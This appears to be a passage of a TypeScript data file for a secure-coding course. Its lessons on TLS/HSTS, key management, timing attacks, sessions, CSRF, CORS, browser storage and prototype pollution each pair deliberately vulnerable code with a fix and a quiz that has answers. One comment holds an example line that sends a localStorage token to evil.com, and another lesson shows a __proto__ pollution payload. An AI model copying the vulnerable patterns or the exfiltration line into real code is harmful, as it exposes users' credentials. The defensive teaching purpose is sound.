  // No Strict-Transport-Security header configured
  next();
});`,
      remediatedCode: `// REMEDIATED: Enforces strict HTTPS redirection and HSTS preload header
import helmet from 'helmet';

// 1. Force HTTPS redirect middleware
app.use((req, res, next) => {
  if (!req.secure && req.get('x-forwarded-proto') !== 'https' && process.env.NODE_ENV === 'production') {
    return res.redirect(301, \`https://\${req.get('host')}\${req.url}\`);
  }
  next();
});

// 2. Configure comprehensive transport security headers
app.use(helmet.hsts({
  maxAge: 63072000, // 2 years in seconds
  includeSubDomains: true, // Applies to all current and future subdomains
  preload: true // Eligible for inclusion in browser HSTS preload list
}));`,
      flawExplanation: 'Without HSTS, the initial HTTP request from a user can be intercepted and downgraded to unencrypted plaintext by an inline attacker.',
      fixExplanation: 'Enforces HTTPS redirects and configures the HSTS header with a 2-year max-age, includeSubDomains, and preload flags.',
    },
    quiz: {
      question: 'What is the security guarantee provided by Perfect Forward Secrecy (PFS)?',
      options: [
        'It prevents passwords from expiring.',
        'Compromise of the server’s long-term private key does not compromise past recorded encrypted session traffic.',
        'It speeds up web page loading by 300%.',
        'It eliminates the need for certificate renewal.',
      ],
      correctAnswer: 1,
      explanation: 'PFS generates ephemeral session keys per connection; even if the server’s master private key is stolen later, past recorded conversations cannot be decrypted.',
    },
    defenseChecklist: [
      'Disable TLS 1.0 and 1.1; enforce TLS 1.2 (AEAD only) and TLS 1.3.',
      'Configure HSTS with max-age >= 31536000 and submit the domain to the HSTS preload list.',
      'Automate certificate renewal using ACME / Let’s Encrypt to prevent service outages.',
      'Verify CA trust chains and hostname matches on all outbound HTTP/TLS clients.',
    ],
  },
  {
    id: '8.4',
    chapterId: 8,
    setIndex: 4,
    title: 'Key management, secrets storage, and rotation',
    summary: 'Architect enterprise key management using AWS KMS, HashiCorp Vault, envelope encryption, and automated rotation.',
    domain: 'cryptography',
    duration: '22 min',
    difficulty: 'Advanced',
    cwe: 'CWE-320: Key Management Errors',
    owaspTop10: 'A02:2021-Cryptographic Failures',
    concepts: [
      {
        title: 'Envelope Encryption Architecture',
        content: 'Encrypting large datasets directly with master keys in a Key Management Service (KMS) is slow, expensive, and risks key exhaustion. Envelope encryption solves this: the KMS generates a plaintext Data Encryption Key (DEK) and an Encrypted DEK. The application encrypts the data using the plaintext DEK, zeroes the plaintext DEK from memory, and stores the Encrypted DEK alongside the ciphertext.',
        keyPrinciple: 'Master keys never leave the Hardware Security Module (HSM).',
      },
      {
        title: 'Cryptographic Key Lifecycle & Automated Rotation',
        content: 'Key management requires five lifecycle stages: Generation (FIPS 140-3 HSM), Storage, Distribution, Rotation (scheduled every 90–365 days), and Revocation/Destruction. Automated rotation re-encrypts DEKs or supports multi-version decryption.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Master database encryption key hardcoded in git repository or container environment variable.',
      cweOrStandard: 'CWE-798: Use of Hard-coded Credentials',
      impact: 'Total compromise of encrypted database backups by anyone with repository access.',
      realWorldScenario: 'An engineer hardcoded the master AES key in a helper file named cryptoUtils.js; when the source code leaked, all user records were decrypted by adversaries.',
    },
    codeAuditLab: {
      language: 'TypeScript / AWS KMS',
      title: 'Envelope Encryption using KMS Data Keys',
      description: 'Implement secure envelope encryption storing only encrypted data keys alongside ciphertext.',
      vulnerableCode: `// VULNERABLE: Static key stored in environment variables; never rotated
import crypto from 'crypto';

const STATIC_MASTER_KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex');

function encryptCustomerPii(piiText: string): string {
  // Same key encrypts millions of records over years; violates key lifecycle guidelines!
  const cipher = crypto.createCipheriv('aes-256-gcm', STATIC_MASTER_KEY, crypto.randomBytes(12));
  return Buffer.concat([cipher.update(piiText, 'utf8'), cipher.final()]).toString('base64');
}`,
      remediatedCode: `// REMEDIATED: Envelope encryption using KMS-managed Customer Master Key (CMK)
import { KMSClient, GenerateDataKeyCommand } from '@aws-sdk/client-kms';
import crypto from 'crypto';

const kms = new KMSClient({ region: 'us-east-1' });

interface EnvelopeRecord {
  ciphertext: string;
  iv: string;
  authTag: string;
  encryptedDataKey: string; // Stored alongside ciphertext
}

export async function encryptWithEnvelope(plaintext: string): Promise<EnvelopeRecord> {
  // 1. Ask KMS to generate a unique 256-bit data key
  const command = new GenerateDataKeyCommand({
    KeyId: process.env.KMS_KEY_ARN!,
    KeySpec: 'AES_256'
  });
  const kmsResponse = await kms.send(command);

  const plaintextDek = Buffer.from(kmsResponse.Plaintext!);
  const encryptedDek = Buffer.from(kmsResponse.CiphertextBlob!).toString('base64');

  // 2. Encrypt data with the plaintext DEK locally
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', plaintextDek, iv);
  const ciphertext = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const authTag = cipher.getAuthTag();

  // 3. Immediately zero the plaintext DEK from memory
  plaintextDek.fill(0);

  return {
    ciphertext: ciphertext.toString('base64'),
    iv: iv.toString('base64'),
    authTag: authTag.toString('base64'),
    encryptedDataKey: encryptedDek
  };
}`,
      flawExplanation: 'Encrypting all data with a single static environment variable key means that if the key leaks, all data across all time is permanently compromised.',
      fixExplanation: 'Implements envelope encryption: generates unique per-record Data Encryption Keys protected by an HSM-backed KMS Customer Master Key.',
    },
    quiz: {
      question: 'In envelope encryption, what component is stored directly alongside the encrypted data record in the database?',
      options: [
        'The KMS root private master key in plaintext.',
        'The encrypted Data Encryption Key (CiphertextBlob) that can only be decrypted by the KMS.',
        'The plaintext user password.',
        'The developer’s SSH key.',
      ],
      correctAnswer: 1,
      explanation: 'The application stores the encrypted Data Key alongside the ciphertext. To read the data, the application asks KMS to decrypt the encrypted key.',
    },
    defenseChecklist: [
      'Store cryptographic master keys in cloud KMS (AWS KMS, Google Cloud KMS, Vault) or HSMs.',
      'Use envelope encryption for large datasets and databases.',
      'Enable automated annual key rotation on all customer managed keys (CMKs).',
      'Immediately zero plaintext keys in memory buffers after encryption/decryption operations.',
    ],
  },
  {
    id: '8.5',
    chapterId: 8,
    setIndex: 5,
    title: 'Cryptographic misuse, side channels, and post-quantum readiness',
    summary: 'Mitigate timing side channels, nonce reuse, and prepare architectures for Post-Quantum Cryptography (PQC).',
    domain: 'cryptography',
    duration: '22 min',
    difficulty: 'Advanced',
    cwe: 'CWE-208: Observable Timing Discrepancy',
    owaspTop10: 'A02:2021-Cryptographic Failures',
    concepts: [
      {
        title: 'Timing Attacks & Constant-Time Comparisons',
        content: 'Standard string equality checks (strA === strB) terminate at the first non-matching byte. An attacker measuring execution time with microsecond precision can determine characters one by one. All cryptographic checks (MACs, signatures, password tokens) must use constant-time comparison (crypto.timingSafeEqual).',
        keyPrinciple: 'Never compare secret hashes or signatures with standard == or === operators.',
      },
      {
        title: 'Post-Quantum Cryptography (PQC) & Crypto-Agility',
        content: 'Shor’s algorithm will render current asymmetric algorithms (RSA, ECC, Diffie-Hellman) completely breakable once cryptographically relevant quantum computers exist. NIST standardized quantum-resistant algorithms: ML-KEM (Kyber) for key encapsulation and ML-DSA (Dilithium) for digital signatures.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Attacker forges valid HMAC webhook signature by measuring response timing microsecond discrepancies.',
      cweOrStandard: 'CWE-208: Observable Timing Discrepancy',
      impact: 'Bypass of API webhook signature verification, executing unauthorized balance top-ups.',
      realWorldScenario: 'An attacker exploited a timing leak in an Xbox 360 hypervisor signature verification check, byte-by-byte discovering the valid signature to execute homebrew firmware.',
    },
    codeAuditLab: {
      language: 'TypeScript / Node.js',
      title: 'Timing Side Channel in Webhook HMAC Verification',
      description: 'Audit a webhook signature verification routine using standard string comparison.',
      vulnerableCode: `// VULNERABLE: Standard string equality leaks timing information byte-by-byte
import crypto from 'crypto';

function verifyWebhookSignature(payload: string, signatureHeader: string, secret: string): boolean {
  const expectedSig = crypto.createHmac('sha256', secret).update(payload).digest('hex');
  // FLAW: === short-circuits on first different character, leaking timing!
  return expectedSig === signatureHeader;
}`,
      remediatedCode: `// REMEDIATED: Constant-time comparison using crypto.timingSafeEqual
import crypto from 'crypto';

export function verifyWebhookSignature(payload: string, signatureHeader: string, secret: string): boolean {
  if (!signatureHeader || typeof signatureHeader !== 'string') return false;

  const expectedHmac = crypto.createHmac('sha256', secret).update(payload).digest();
  const providedHmac = Buffer.from(signatureHeader, 'hex');

  // Both buffers must be of equal length for timingSafeEqual
  if (expectedHmac.length !== providedHmac.length) {
    return false;
  }

  // Executes in strictly constant time regardless of where differences occur
  return crypto.timingSafeEqual(expectedHmac, providedHmac);
}`,
      flawExplanation: 'String comparison (===) aborts immediately when a mismatched character is found; attackers measure timing differences to guess signatures byte-by-byte.',
      fixExplanation: 'Uses crypto.timingSafeEqual to ensure the comparison executes in constant time regardless of whether characters match.',
    },
    quiz: {
      question: 'Which Post-Quantum Cryptography (PQC) key encapsulation standard was finalized by NIST in 2024 to replace RSA and ECC key exchange?',
      options: [
        'ML-KEM (formerly CRYSTALS-Kyber)',
        'AES-512-CBC',
        'MD6',
        'DES3',
      ],
      correctAnswer: 0,
      explanation: 'ML-KEM (Module-Lattice-Based Key-Encapsulation Mechanism, based on CRYSTALS-Kyber) is NIST’s primary standard for post-quantum key exchange.',
    },
    defenseChecklist: [
      'Always use crypto.timingSafeEqual() when comparing cryptographic hashes, HMACs, or tokens.',
      'Never reuse nonces in AES-GCM; nonce reuse completely destroys confidentiality and integrity.',
      'Adopt crypto-agility: design modular abstractions so cryptographic algorithms can be swapped easily.',
      'Begin testing hybrid classical/PQC key exchange in TLS 1.3 (e.g., X25519Kyber768).',
    ],
  },

  // CHAPTER 9
  {
    id: '9.1',
    chapterId: 9,
    setIndex: 1,
    title: 'Cookies, tokens, JWT, and session fixation',
    summary: 'Design bulletproof session architectures balancing server-side sessions vs. stateless JWTs and cookie hardening.',
    domain: 'client-api',
    duration: '22 min',
    difficulty: 'Intermediate',
    cwe: 'CWE-384: Session Fixation / CWE-1004: Missing HttpOnly',
    owaspTop10: 'A07:2021-Identification and Authentication Failures',
    concepts: [
      {
        title: 'Server-Side Sessions vs. Client-Side JWTs',
        content: 'Server-side sessions store state in a centralized fast store (Redis) and send an opaque random ID in an HttpOnly cookie. They support instant revocation. Stateless JWTs embed claims inside a self-contained token, avoiding database lookups but making immediate revocation difficult without distributed token blacklists.',
        keyPrinciple: 'For browser web applications, hardened HttpOnly/SameSite session cookies are far more secure than storing JWTs in localStorage.',
      },
      {
        title: 'The Session Lifecycle Checklist',
        content: '1. Issue cryptographically random IDs (>= 128 bits entropy). 2. Regenerate ID upon login. 3. Enforce both idle timeout (e.g. 15 mins) and absolute timeout (e.g. 8 hours). 4. Invalidate on server upon logout.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Attacker plants known session ID in victim’s browser before victim logs in; session is not regenerated upon login.',
      cweOrStandard: 'CWE-384: Session Fixation',
      impact: 'Attacker takes over authenticated session after victim logs in.',
      realWorldScenario: 'A banking site accepted session IDs from URL query params (?SID=xyz) without regenerating on login, allowing attackers to send links and take over accounts.',
    },
    codeAuditLab: {
      language: 'TypeScript / Express Session',
      title: 'Session Fixation on User Login',
      description: 'Audit a login handler that authenticates credentials without regenerating the session identifier.',
      vulnerableCode: `// VULNERABLE: Retains old pre-authentication session ID upon login
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await verifyCredentials(username, password);

  if (!user) return res.status(401).send('Unauthorized');

  // FLAW: Keeps existing session ID! If attacker planted it, attacker is now authenticated!
  req.session.userId = user.id;
  req.session.role = user.role;
  res.json({ success: true });
});`,
      remediatedCode: `// REMEDIATED: Regenerates session ID upon login to neutralize session fixation
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await verifyCredentials(username, password);

  if (!user) return res.status(401).send('Unauthorized');

  // Destroy old session and generate brand new cryptographically random ID
  req.session.regenerate((err) => {
    if (err) return res.status(500).send('Session initialization error');

    req.session.userId = user.id;
    req.session.role = user.role;
    req.session.authenticatedAt = Date.now();

    req.session.save((saveErr) => {
      if (saveErr) return res.status(500).send('Session save error');
      res.json({ success: true, user: { id: user.id, username: user.username } });
    });
  });
});`,
      flawExplanation: 'Failing to call req.session.regenerate() preserves the previous session ID, allowing an attacker who planted that ID to ride the authenticated session.',
      fixExplanation: 'Invokes req.session.regenerate() immediately upon authentication, issuing a fresh session identifier and discarding the old state.',
    },
    quiz: {
      question: 'Where should sensitive session authentication tokens be stored in modern browser web applications?',
      options: [
        'In window.localStorage so all scripts can access it easily.',
        'In an HttpOnly, Secure, SameSite=Lax (or Strict) HTTP cookie.',
        'In a global JavaScript variable window.__TOKEN.',
        'In the URL query string parameter (?token=...).',
      ],
      correctAnswer: 1,
      explanation: 'HttpOnly cookies are inaccessible to client-side JavaScript, protecting the token from being stolen even if an XSS flaw exists on the page.',
    },
    defenseChecklist: [
      'Always regenerate session IDs upon login and privilege escalation.',
      'Enforce HttpOnly, Secure, and SameSite attributes on all session cookies.',
      'Implement server-side session termination on logout, destroying the session in Redis/DB.',
      'Enforce short idle timeouts (15–30 minutes) and strict absolute session caps.',
    ],
  },
  {
    id: '9.2',
    chapterId: 9,
    setIndex: 2,
    title: 'CSRF, clickjacking, and browser-based attacks',
    summary: 'Defeat Cross-Site Request Forgery using SameSite cookies and anti-CSRF tokens; mitigate clickjacking with CSP frame-ancestors.',
    domain: 'client-api',
    duration: '22 min',
    difficulty: 'Intermediate',
    cwe: 'CWE-352: Cross-Site Request Forgery (CSRF) / CWE-1021: Clickjacking',
    owaspTop10: 'A01:2021-Broken Access Control',
    concepts: [
      {
        title: 'Cross-Site Request Forgery (CSRF) Defense',
        content: 'CSRF forces a victim’s authenticated browser to issue unwanted HTTP requests to a target site that relies on ambient credentials (cookies, HTTP basic auth). Remediation: 1. SameSite=Lax or Strict cookie attribute. 2. Anti-CSRF Synchronizer Tokens (validating a cryptographically random token embedded in state-altering forms/headers). 3. Custom request headers (X-Requested-With / Origin validation).',
        keyPrinciple: 'SameSite cookies provide strong default defense; high-value state-changing actions should also require anti-CSRF tokens.',
      },
      {
        title: 'Clickjacking & UI Redressing Defense',
        content: 'Clickjacking tricks users into clicking an invisible iframe button layered over benign UI. Modern defense: Content-Security-Policy: frame-ancestors \'none\' (or \'self\'), completely replacing the legacy, deprecated X-Frame-Options: DENY.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Attacker creates malicious webpage with hidden form auto-submitting POST to /api/account/email with victim’s session cookie.',
      cweOrStandard: 'CWE-352: Cross-Site Request Forgery (CSRF)',
      impact: 'Account email is modified to attacker address, triggering password reset and account takeover.',
      realWorldScenario: 'A home router allowed remote DNS modification via an unauthenticated or cookie-authenticated POST request; visiting a malicious blog reconfigured victims’ DNS.',
    },
    codeAuditLab: {
      language: 'TypeScript / Express Security',
      title: 'CSRF Vulnerability in State-Altering Endpoint',
      description: 'Audit a profile update handler susceptible to cross-site request forgery.',
      vulnerableCode: `// VULNERABLE: State-altering POST endpoint without CSRF protection or Origin check
app.post('/api/user/change-email', authenticateSession, async (req, res) => {
  const { newEmail } = req.body;
  // Browser automatically attaches session cookie; request succeeds from malicious external sites!
  await db.updateUserEmail(req.session.userId, newEmail);
  res.json({ status: 'email_updated' });
});`,
      remediatedCode: `// REMEDIATED: Origin verification & Anti-CSRF Double-Submit / Synchronizer Token
import crypto from 'crypto';

app.post('/api/user/change-email', authenticateSession, async (req, res) => {
  // 1. Strict Origin / Referer validation
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigin = 'https://app.securecompany.com';
  if (!origin || !origin.startsWith(allowedOrigin)) {
    return res.status(403).json({ error: 'CSRF violation: Invalid request origin' });
  }

  // 2. Validate Anti-CSRF token from custom header
  const clientCsrfToken = req.headers['x-csrf-token'];
  const expectedToken = req.session.csrfSecret;

  if (!clientCsrfToken || !expectedToken || clientCsrfToken !== expectedToken) {
    return res.status(403).json({ error: 'CSRF token missing or mismatch' });
  }

  const { newEmail } = req.body;
  await db.updateUserEmail(req.session.userId, newEmail);
  res.json({ status: 'email_updated' });
});`,
      flawExplanation: 'Because browsers attach cookies automatically to cross-origin requests, an external site can force victims to submit state changes.',
      fixExplanation: 'Verifies the HTTP Origin header against an allowlist and requires a cryptographically random anti-CSRF token in the X-CSRF-Token header.',
    },
    quiz: {
      question: 'Which modern HTTP response header directive definitively prevents clickjacking by restricting which domains can embed the page inside an iframe?',
      options: [
        'Content-Security-Policy: frame-ancestors \'none\';',
        'X-XSS-Protection: 1; mode=block',
        'Access-Control-Allow-Origin: *',
        'Cache-Control: no-cache',
      ],
      correctAnswer: 0,
      explanation: 'Content-Security-Policy: frame-ancestors \'none\' instructs modern browsers to block any attempt to frame the page, preventing clickjacking.',
    },
    defenseChecklist: [
      'Set SameSite=Lax or SameSite=Strict on all authentication cookies.',
      'Require custom headers (e.g. X-CSRF-Token or X-Requested-With) on all state-altering POST/PUT/DELETE APIs.',
      'Deploy Content-Security-Policy: frame-ancestors \'none\' to eliminate clickjacking.',
      'Validate Origin and Referer headers against an explicit server allowlist on state-changing requests.',
    ],
  },
  {
    id: '9.3',
    chapterId: 9,
    setIndex: 3,
    title: 'CORS, CSP, security headers, and same-origin policy',
    summary: 'Master the Same-Origin Policy (SOP), strict Cross-Origin Resource Sharing (CORS), and Content Security Policy (CSP Level 3).',
    domain: 'client-api',
    duration: '22 min',
    difficulty: 'Intermediate',
    cwe: 'CWE-942: Permissive Cross-Domain Policy with Untrusted Domains',
    owaspTop10: 'A05:2021-Security Misconfiguration',
    concepts: [
      {
        title: 'Same-Origin Policy (SOP) & CORS Misconfigurations',
        content: 'The SOP prevents scripts on one origin (scheme + host + port) from reading responses from another origin. CORS is a relaxing mechanism that allows servers to grant explicit exceptions. The most dangerous CORS misconfiguration is reflecting the incoming Origin header while setting Access-Control-Allow-Credentials: true, effectively giving every website in the world full access to authenticated private data.',
        keyPrinciple: 'Never reflect Origin blindly with Allow-Credentials: true. Use strict origin allowlists.',
      },
      {
        title: 'Content Security Policy (CSP Level 3)',
        content: 'CSP is a defense-in-depth header restricting where scripts, styles, images, and frames can load from. Modern strict CSP uses cryptographic nonces (script-src \'nonce-{random}\' \'strict-dynamic\') to disable inline eval and injected scripts.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Attacker site initiates cross-origin fetch to victim API; server reflects Origin with Allow-Credentials: true.',
      cweOrStandard: 'CWE-942: Permissive Cross-Domain Policy with Untrusted Domains',
      impact: 'Attacker website reads victim’s confidential personal data and private messages.',
      realWorldScenario: 'A cryptocurrency exchange echoed req.headers.origin in Access-Control-Allow-Origin with credentials=true; a malicious blog loaded by an authenticated trader extracted account balances.',
    },
    codeAuditLab: {
      language: 'TypeScript / Express CORS',
      title: 'Permissive CORS Origin Reflection with Credentials',
      description: 'Audit a CORS middleware reflecting arbitrary incoming origin headers.',
      vulnerableCode: `// VULNERABLE: Blindly echoes the requesting origin and permits cookies!
app.use((req, res, next) => {
  const origin = req.headers.origin;
  // Catastrophic: Any site on the Internet can read private authenticated data!
  res.header('Access-Control-Allow-Origin', origin);
  res.header('Access-Control-Allow-Credentials', 'true');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  next();
});`,
      remediatedCode: `// REMEDIATED: Strict CORS origin allowlist with explicit credential scoping
import cors from 'cors';

const ALLOWED_ORIGINS = new Set([
  'https://app.securecompany.com',
  'https://admin.securecompany.com'
]);

app.use(cors({
  origin: (origin, callback) => {
    // Allow non-browser requests (mobile apps, server-to-server) or approved origins
    if (!origin || ALLOWED_ORIGINS.has(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Cross-Origin Request Blocked by Security Policy'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  maxAge: 86400 // Cache preflight response for 24 hours
}));`,
      flawExplanation: 'Reflecting req.headers.origin with Allow-Credentials: true bypasses the browser’s Same-Origin Policy entirely, granting external sites authenticated access.',
      fixExplanation: 'Enforces a strict static Set allowlist of approved domains and rejects unapproved origins with a security error.',
    },
    quiz: {
      question: 'Which of the following describes the most severe CORS misconfiguration vulnerability?',
      options: [
        'Setting Access-Control-Allow-Origin: * on a public read-only image CDN.',
        'Reflecting the client’s Origin header while setting Access-Control-Allow-Credentials: true on an authenticated API.',
        'Setting Access-Control-Max-Age to 3600 seconds.',
        'Allowing the GET method in Access-Control-Allow-Methods.',
      ],
      correctAnswer: 1,
      explanation: 'Reflecting any origin while allowing credentials allows an attacker to host a webpage that reads authenticated API responses directly from the victim’s session.',
    },
    defenseChecklist: [
      'Never reflect the Origin header dynamically when Access-Control-Allow-Credentials is true.',
      'Enforce strict Content-Security-Policy (CSP) headers with nonce or strict-dynamic.',
      'Deploy security headers: X-Content-Type-Options: nosniff, Referrer-Policy: strict-origin-when-cross-origin.',
      'Audit CORS preflight handling (OPTIONS) to ensure headers are strictly validated.',
    ],
  },
  {
    id: '9.4',
    chapterId: 9,
    setIndex: 4,
    title: 'Local storage, IndexedDB, and client-side data protection',
    summary: 'Analyze browser storage security limits, XSS exfiltration risks, and client-side Web Crypto API encryption.',
    domain: 'client-api',
    duration: '20 min',
    difficulty: 'Intermediate',
    cwe: 'CWE-922: Insecure Storage of Sensitive Information',
    owaspTop10: 'A04:2021-Insecure Design',
    concepts: [
      {
        title: 'The Security Boundaries of Browser Storage',
        content: 'window.localStorage, sessionStorage, and IndexedDB have zero access control beyond the Same-Origin Policy. Any script running in the origin—including third-party analytics, chat widgets, or injected XSS payloads—can read every key in localStorage in a single line of JavaScript (Object.entries(localStorage)).',
        keyPrinciple: 'Never store sensitive long-lived tokens, passwords, or encryption keys in localStorage.',
      },
      {
        title: 'Client-Side Web Crypto API Protection',
        content: 'When client-side data caching is necessary (e.g. offline progressive web apps), use the browser Web Crypto API (SubtleCrypto) with non-extractable keys (extractable: false) or hardware-backed WebAuthn credentials.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Attacker exploits minor third-party script compromise to exfiltrate all JWT tokens stored in localStorage.',
      cweOrStandard: 'CWE-922: Insecure Storage of Sensitive Information',
      impact: 'Permanent account takeover and session theft for all users of the web application.',
      realWorldScenario: 'An analytics script loaded via Google Tag Manager was hijacked by attackers; the script looped through localStorage, finding master JWT access tokens and sending them to an exfiltration server.',
    },
    codeAuditLab: {
      language: 'TypeScript / React State',
      title: 'Storing Master Tokens in LocalStorage vs. Memory + HttpOnly Cookie',
      description: 'Audit a client-side auth provider persisting master refresh tokens in unencrypted localStorage.',
      vulnerableCode: `// VULNERABLE: Stores master JWT in unencrypted localStorage accessible to any XSS or 3rd-party script
function handleLoginSuccess(tokens: { accessToken: string; refreshToken: string }) {
  // FLAW: Exfiltratable via: fetch('https://evil.com/?t=' + localStorage.getItem('token'))
  localStorage.setItem('accessToken', tokens.accessToken);
  localStorage.setItem('refreshToken', tokens.refreshToken);
}`,
      remediatedCode: `// REMEDIATED: Retains access token in-memory only; refresh token kept in HttpOnly cookie
class SecureAuthStore {
  private static inMemoryAccessToken: string | null = null;

  public static setAccessToken(token: string) {
    this.inMemoryAccessToken = token;
  }

  public static getAccessToken(): string | null {
    return this.inMemoryAccessToken;
  }

  public static clear() {
    this.inMemoryAccessToken = null;
  }

  // Master refresh token is NEVER handled by JavaScript;
  // It is set as an HttpOnly, Secure cookie by the authentication backend!
  public static async refreshAccessToken(): Promise<string | null> {
    const res = await fetch('/api/auth/refresh', {
      method: 'POST',
      credentials: 'include' // Transmits HttpOnly cookie securely
    });

    if (res.ok) {
      const { accessToken } = await res.json();
      this.setAccessToken(accessToken);
      return accessToken;
    }
    this.clear();
    return null;
  }
}`,
      flawExplanation: 'localStorage provides zero protection against XSS; an injected script can read localStorage.getItem("token") and exfiltrate credentials instantly.',
      fixExplanation: 'Keeps short-lived access tokens strictly in JavaScript runtime memory and delegates persistent refresh to an HttpOnly cookie.',
    },
    quiz: {
      question: 'Why is storing user session tokens in window.localStorage considered a security risk compared to HttpOnly cookies?',
      options: [
        'Because localStorage is deleted whenever the user closes their browser.',
        'Because any JavaScript running in the page (including third-party SDKs or XSS injections) can read all data from localStorage.',
        'Because localStorage can only hold 50 bytes of text.',
        'Because modern web browsers block localStorage on HTTPS.',
      ],
      correctAnswer: 1,
      explanation: 'Any script on the page can inspect and exfiltrate everything in localStorage, whereas HttpOnly cookies cannot be accessed by client JavaScript.',
    },
    defenseChecklist: [
      'Never store high-privilege access tokens or refresh tokens in localStorage or sessionStorage.',
      'Use memory-only state management for active API tokens, refreshed via HttpOnly cookies.',
      'Sanitize client-side caches and clear memory on explicit user logout.',
      'Audit third-party scripts and tag managers that execute in the origin context.',
    ],
  },
  {
    id: '9.5',
    chapterId: 9,
    setIndex: 5,
    title: 'SPA, PWA, and modern front-end security',
    summary: 'Harden Single Page Applications (SPAs) and Progressive Web Apps (PWAs) against service worker poisoning and prototype pollution.',
    domain: 'client-api',
    duration: '22 min',
    difficulty: 'Advanced',
    cwe: 'CWE-1321: Improperly Controlled Modification of Object Prototype Attributes (\'Prototype Pollution\')',
    owaspTop10: 'A08:2021-Software and Data Integrity Failures',
    concepts: [
      {
        title: 'Prototype Pollution in JavaScript SPAs',
        content: 'Prototype pollution occurs when an attacker injects properties into Object.prototype via recursive object merge or deep assignment utilities (e.g. payload: { "__proto__": { "isAdmin": true } }). Because all JavaScript objects inherit from Object.prototype, every object in the application receives the poisoned property, leading to authorization bypass, denial of service, or remote code execution.',
        keyPrinciple: 'Never perform unchecked recursive property assignment with Object.assign or deep-merge libraries.',
      },
      {
        title: 'PWA Service Worker Security',
        content: 'Service workers act as network proxies between the browser and web. If an attacker tampers with a service worker script, they establish persistent man-in-the-middle capabilities. Service workers must be served over HTTPS with strict Cache-Control: no-cache and validated script hashes.',
      },
    ],
    vulnerabilityAnatomy: {
      threatVector: 'Attacker sends JSON with __proto__ key into recursive merge function, polluting global object prototype.',
      cweOrStandard: 'CWE-1321: Prototype Pollution',
      impact: 'Global privilege escalation where all objects inherit isAdmin: true.',
      realWorldScenario: 'Vulnerable versions of lodash.merge allowed attackers to pollute Object.prototype.isAdmin, granting all authenticated users superadmin access.',
    },
    codeAuditLab: {
      language: 'TypeScript / Node.js & Browser',
      title: 'Client & Server Prototype Pollution in Deep Merge',
      description: 'Audit a naive recursive object merge function susceptible to prototype pollution.',
      vulnerableCode: `// VULNERABLE: Unchecked recursive merge allows prototype pollution via __proto__ or constructor
function deepMergeUnsafe(target: any, source: any) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      // FLAW: If key === '__proto__' or 'constructor', pollutes Object.prototype!
      deepMergeUnsafe(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}`,
      remediatedCode: `// REMEDIATED: Blocks dangerous prototype keys and uses Object.create(null)
const BANNED_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

export function deepMergeSafe(target: Record<string, any>, source: Record<string, any>) {
  for (const key of Object.keys(source)) {
    // 1. Explicitly drop forbidden prototype keys
    if (BANNED_KEYS.has(key)) {
      continue;
    }

    const sourceVal = source[key];
    if (typeof sourceVal === 'object' && sourceVal !== null && !Array.isArray(sourceVal)) {
      if (!Object.prototype.hasOwnProperty.call(target, key) || typeof target[key] !== 'object') {
        target[key] = Object.create(null); // Key without prototype inheritance
      }
      deepMergeSafe(target[key], sourceVal);
    } else {
      target[key] = sourceVal;
    }
  }
  return target;
}`,
      flawExplanation: 'Merging keys named "__proto__" or "constructor" mutates the global Object.prototype, affecting every object in the JavaScript runtime.',
      fixExplanation: 'Filters out "__proto__", "constructor", and "prototype" keys, preventing tampering with object prototype chains.',
    },
    quiz: {
      question: 'What is the most effective defense against client-side and server-side JavaScript prototype pollution?',
      options: [
        'Freezing Object.prototype via Object.freeze(Object.prototype) or stripping __proto__ and constructor keys during object parsing.',
        'Using TypeScript interfaces instead of types.',
        'Converting all JSON to XML.',
        'Increasing node memory limit to 4GB.',
      ],
      correctAnswer: 0,
      explanation: 'Stripping __proto__ and constructor keys or calling Object.freeze(Object.prototype) makes the prototype chain immutable against pollution.',
    },
    defenseChecklist: [
      'Call Object.freeze(Object.prototype) at application startup to block prototype tampering.',
      'Filter out "__proto__", "constructor", and "prototype" in deep-merge operations.',
      'Serve service worker scripts with Cache-Control: no-cache and strict HTTPS.',
      'Use Subresource Integrity (SRI) on external scripts loaded in SPA index.html files.',
    ],
  },
];
